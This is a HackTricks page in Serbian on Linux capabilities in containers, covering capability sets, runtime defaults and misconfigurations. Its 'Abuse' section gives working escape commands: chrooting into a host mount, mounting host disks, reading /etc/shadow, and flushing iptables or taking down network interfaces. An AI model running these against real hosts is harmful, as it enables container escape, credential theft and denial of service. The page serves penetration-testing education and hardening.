# Linux Capabilities U Kontejnerima

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux capabilities su jedan od najvažnijih delova container security-ja jer daju odgovor na suptilno, ali fundamentalno pitanje: **šta „root“ zaista znači unutar kontejnera?** Na uobičajenom Linux sistemu, UID 0 je istorijski podrazumevao veoma širok skup privilegija. U modernim kernelima, ta privilegija je razložena na manje jedinice koje se nazivaju capabilities. Proces može da radi kao root, a da i dalje nema mnoge moćne operacije ako su relevantne capabilities uklonjene.

Kontejneri se u velikoj meri oslanjaju na ovu razliku. Mnogi workload-i se i dalje pokreću kao UID 0 unutar kontejnera zbog kompatibilnosti ili jednostavnosti. Bez uklanjanja capabilities, to bi bilo previše opasno. Uz uklanjanje capabilities, root proces unutar kontejnera i dalje može da obavlja mnoge uobičajene zadatke unutar kontejnera, dok mu se uskraćuju osetljivije kernel operacije. Zato shell unutar kontejnera koji prikazuje `uid=0(root)` ne znači automatski „host root“ niti čak „široke kernel privilegije“. Skup capabilities određuje koliko ta root identifikacija zaista vredi.

Za potpunu referencu Linux capabilities i mnoge primere zloupotrebe, pogledajte:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operacija

Capabilities se prate u nekoliko skupova, uključujući permitted, effective, inheritable, ambient i bounding skupove. Za mnoge procene kontejnera, precizna kernel semantika svakog skupa je manje neposredno važna od praktičnog pitanja: **koje privilegovane operacije ovaj proces trenutno može uspešno da izvrši i koji budući dobici privilegija su još uvek mogući?**

Ovo je važno zato što su mnoge breakout tehnike zapravo problemi sa capabilities, maskirani kao problemi sa kontejnerima. Workload sa `CAP_SYS_ADMIN` može da pristupi ogromnoj količini kernel funkcionalnosti kojoj normalan root proces u kontejneru ne bi trebalo da pristupa. Workload sa `CAP_NET_ADMIN` postaje mnogo opasniji ako deli host network namespace. Workload sa `CAP_SYS_PTRACE` postaje mnogo interesantniji ako može da vidi host procese kroz deljenje host PID prostora. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`; u Kubernetes-u se obično pojavljuje kao `hostPID: true`.

Drugim rečima, skup capabilities ne može da se procenjuje izolovano. Mora se posmatrati zajedno sa namespaces, seccomp i MAC policy-jem.

## Lab

Veoma direktan način za proveru capabilities unutar kontejnera je:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Možete takođe uporediti restriktivniji container sa onim kojem su dodate sve capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Da biste videli efekat uskog dodavanja, pokušajte da uklonite sve i vratite samo jednu capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ovi mali eksperimenti pomažu da se pokaže da runtime ne menja jednostavno boolean pod nazivom "privileged". On oblikuje stvarnu površinu privilegija dostupnu procesu.

## Capabilities visokog rizika

Iako mnoge capabilities mogu biti važne u zavisnosti od cilja, nekoliko njih se iznova pokazuje relevantnim u analizi container escape-a.

**`CAP_SYS_ADMIN`** je capability prema kojoj bi defenderi trebalo da budu najoprezniji. Često se opisuje kao "the new root" jer otključava ogroman broj funkcionalnosti, uključujući operacije povezane sa mount-ovima, ponašanje osetljivo na namespace-e i mnoge kernel putanje koje nikada ne bi trebalo nepromišljeno izlagati container-ima. Ako container ima `CAP_SYS_ADMIN`, slab seccomp i nema snažnu MAC izolaciju, mnoge klasične breakout putanje postaju znatno realnije.

**`CAP_SYS_PTRACE`** je važan kada postoji vidljivost procesa, naročito ako se PID namespace deli sa hostom ili sa zanimljivim susednim workload-ovima. Može pretvoriti vidljivost u tampering.

**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** važni su u network-focused okruženjima. Na izolovanoj bridge mreži već mogu biti rizični; u deljenom host network namespace-u situacija je mnogo gora, jer workload može moći da rekonfiguriše host networking, vrši sniffing, spoofing ili ometa lokalne network tokove.

**`CAP_SYS_MODULE`** je obično katastrofalan u rootful okruženju, jer je učitavanje kernel modula praktično kontrola nad host kernel-om. Gotovo nikada ne bi trebalo da se pojavljuje u general-purpose container workload-u.

## Upotreba runtime-a

Docker, Podman, stack-ovi zasnovani na containerd-u i CRI-O koriste capability kontrole, ali se podrazumevane vrednosti i interfejsi za upravljanje razlikuju. Docker ih izlaže veoma direktno kroz flagove kao što su `--cap-drop` i `--cap-add`. Podman izlaže slične kontrole i često dobija dodatni safety layer kroz rootless izvršavanje. Kubernetes izlaže dodavanje i uklanjanje capabilities kroz `securityContext` Pod-a ili container-a. System-container okruženja kao što su LXC/Incus takođe se oslanjaju na kontrolu capabilities, ali šira integracija tih sistema sa hostom često navodi operatore da agresivnije opuštaju podrazumevane postavke nego što bi to radili u app-container okruženju.

Isti princip važi za sva ova okruženja: capability koju je tehnički moguće dodeliti nije nužno capability koju treba dodeliti. Mnogi incidenti iz stvarnog sveta počinju kada operator doda capability jednostavno zato što je workload otkazao pod strožom konfiguracijom, a timu je bio potreban brz fix.

## Pogrešne konfiguracije

Najočiglednija greška je **`--cap-add=ALL`** u Docker/Podman-style CLI alatima, ali to nije jedina greška. U praksi je češći problem dodeljivanje jedne ili dve izuzetno moćne capabilities, naročito `CAP_SYS_ADMIN`, da bi se "aplikacija osposobila za rad", bez razumevanja posledica po namespace, seccomp i mount konfiguraciju. Drugi čest failure mode je kombinovanje dodatnih capabilities sa deljenjem host namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`, `--network=host` ili `--userns=host`; u Kubernetes-u se ekvivalentna izloženost obično pojavljuje kroz workload postavke kao što su `hostPID: true` ili `hostNetwork: true`. Svaka od tih kombinacija menja ono na šta capability zaista može da utiče.

Takođe je uobičajeno da administratori veruju da je workload i dalje smisleno ograničen zato što nije u potpunosti `--privileged`. Ponekad je to tačno, ali je ponekad effective posture već dovoljno blizu privileged režimu da ta razlika operativno prestaje da bude važna.

## Abuse

Prvi praktični korak je enumeracija effective capability skupa i neposredno testiranje capability-specific akcija koje bi bile važne za escape ili pristup informacijama sa hosta:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Ako je `CAP_SYS_ADMIN` prisutan, prvo testirajte zloupotrebu zasnovanu na mount-u i pristup host filesystem-u, jer je ovo jedan od najčešćih načina omogućavanja breakout-a:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Ako je `CAP_SYS_PTRACE` prisutan i kontejner može da vidi zanimljive procese, proverite da li se capability može iskoristiti za pregled procesa:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Ako su prisutne `CAP_NET_ADMIN` ili `CAP_NET_RAW`, testirajte da li workload može da manipuliše vidljivim mrežnim stekom ili barem da prikuplja korisne mrežne informacije:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Kada test capability bude uspešan, povežite ga sa situacijom u namespace-u. Capability koja u izolovanom namespace-u deluje samo rizično može odmah postati escape ili host-recon primitive kada container takođe deli host PID, host network ili host mounts.

### Potpun primer: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Ako container ima `CAP_SYS_ADMIN` i writable bind mount host filesystem-a, kao što je `/host`, putanja za escape je često jednostavna:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Ako `chroot` uspe, komande se sada izvršavaju u kontekstu root sistema datoteka hosta:
```bash
id
hostname
cat /etc/shadow | head
```
Ako `chroot` nije dostupan, isti rezultat se često može postići pozivanjem binarne datoteke kroz montirano stablo:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Potpuni primer: `CAP_SYS_ADMIN` + pristup uređaju

Ako je blok uređaj sa hosta izložen, `CAP_SYS_ADMIN` može da omogući direktan pristup fajl sistemu hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Potpun primer: `CAP_NET_ADMIN` + Host Networking

Ova kombinacija ne dovodi uvek direktno do root pristupa na hostu, ali može u potpunosti da rekonfiguriše mrežni stack hosta:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
To može omogućiti denial of service, presretanje saobraćaja ili pristup servisima koji su ranije bili filtrirani.

## Provere

Cilj provera capabilities nije samo ispisivanje sirovih vrednosti, već razumevanje toga da li proces ima dovoljno privilegija da njegove trenutne namespace i mount okolnosti učini opasnim.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Šta je ovde zanimljivo:

- `capsh --print` je najlakši način da uočite visokorizične capabilities kao što su `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ili `cap_sys_module`.
- Linija `CapEff` u `/proc/self/status` govori šta je trenutno zaista aktivno, a ne samo šta bi moglo biti dostupno u drugim setovima.
- Capability dump postaje mnogo važniji ako container takođe deli host PID, network ili user namespaces, ili ima writable host mount-ove.

Nakon prikupljanja sirovih informacija o capabilities, sledeći korak je njihovo tumačenje. Proverite da li je proces root, da li su user namespaces aktivni, da li se dele host namespaces, da li seccomp sprovodi ograničenja i da li AppArmor ili SELinux i dalje ograničavaju proces. Sam capability set je samo deo priče, ali često upravo on objašnjava zašto jedan container breakout funkcioniše, a drugi ne uspeva sa istom prividnom početnom tačkom.

## Podrazumevane postavke runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Smanjen capability set po podrazumevanim postavkama | Docker zadržava podrazumevanu allowlist listu capabilities i uklanja ostale | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Smanjen capability set po podrazumevanim postavkama | Podman containers su po podrazumevanim postavkama unprivileged i koriste smanjen capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Nasleđuje podrazumevane postavke runtime-a ako nisu izmenjene | Ako nije naveden nijedan `securityContext.capabilities`, container dobija podrazumevani capability set od runtime-a | `securityContext.capabilities.add`, izostavljanje `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O pod Kubernetes-om | Obično podrazumevane postavke runtime-a | Efektivni set zavisi od runtime-a i Pod spec-a | isto kao u redu za Kubernetes; direktna OCI/CRI konfiguracija takođe može eksplicitno dodati capabilities |

Za Kubernetes je važno to što API ne definiše jedan univerzalni podrazumevani capability set. Ako Pod ne dodaje niti uklanja capabilities, workload nasleđuje podrazumevanu vrednost runtime-a za taj node.

{{#include ../../../../banners/hacktricks-training.md}}
